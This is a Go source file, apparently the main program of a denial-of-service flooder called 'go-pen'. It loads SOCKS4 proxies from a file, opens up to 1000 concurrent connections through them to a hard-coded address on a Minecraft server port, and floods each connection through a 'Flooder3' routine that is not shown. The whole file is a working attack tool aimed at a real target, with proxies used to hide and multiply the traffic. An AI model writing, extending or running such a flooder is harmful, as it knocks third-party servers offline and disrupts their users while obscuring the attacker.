package main

import (
	"bufio"
	"fmt"
	"go-pen/methods"
	"log"
	"os"
	"strconv"
	"strings"
	"time"

	"h12.io/socks"
)

func getArguments(cleanArgs []string) (string, int, int) {
	argsMessage := "Arguments: <ip:port> <threads> <loop>"

	if len(cleanArgs) < 3 {
		fmt.Println(argsMessage)
		os.Exit(1) // is it a good way to do that....
	}

	var serverAddress = cleanArgs[0]

	if !strings.Contains(serverAddress, ":") {
		fmt.Println(argsMessage)
		os.Exit(1)
	}

	threads, err := strconv.Atoi(cleanArgs[1])
	loop, errn := strconv.Atoi(cleanArgs[2])

	if err != nil || errn != nil {
		fmt.Println(argsMessage)
		os.Exit(1)
	}

	return serverAddress, threads, loop
}

func parseProxies() []string {
	file, err := os.Open("proxies.txt")

	if err != nil {
		log.Fatal("Something is wrong with proxies.txt, ", err)
	}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)

	var proxies []string

	for scanner.Scan() {
		proxies = append(proxies, scanner.Text())
	}

	file.Close()

	return proxies
}

func remove(s []string, i int) []string {
	s[i] = s[len(s)-1]

	return s[:len(s)-1]
}

func connect(proxyAddress string, serverAddress string, proxies []string, i int, data *methods.Data, guard chan struct{}) {
	address := fmt.Sprintf("socks4://%s?timeout=5s", proxyAddress)

	dialSocks := socks.Dial(address)
	conn, err := dialSocks("tcp", serverAddress)

	if err != nil {
		proxies = remove(proxies, i)
		<-guard
	} else {
		for {
			if methods.Flooder3(data, conn) {
				<-guard
				return
			}

			time.Sleep(1 * time.Millisecond)
		}
	}
}

func main() {
	address, cooldown, loop := "193.164.16.163:25565", 5, 1 //getArguments(os.Args[1:])

	fmt.Println(cooldown)

	proxies := parseProxies()
	data := methods.Data{Address: address, Loop: loop}

	guard := make(chan struct{}, 1000)

	for i, proxy := range proxies {
		guard <- struct{}{}
		go connect(proxy, address, proxies, i, &data, guard)
		//time.Sleep(1 * time.Millisecond)
	}
}
